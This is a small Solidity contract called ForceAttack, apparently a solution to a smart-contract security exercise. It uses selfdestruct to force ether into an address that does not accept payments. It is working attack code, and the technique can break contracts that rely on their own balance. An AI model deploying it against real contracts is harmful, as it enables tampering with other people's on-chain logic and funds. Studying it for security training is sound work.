// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';

contract ForceAttack is Ownable {
    function reload() external payable {}

    function forceEtherIntoAddress(address payable _to) external onlyOwner {
        selfdestruct(_to);
    }

    receive() external payable {}
}
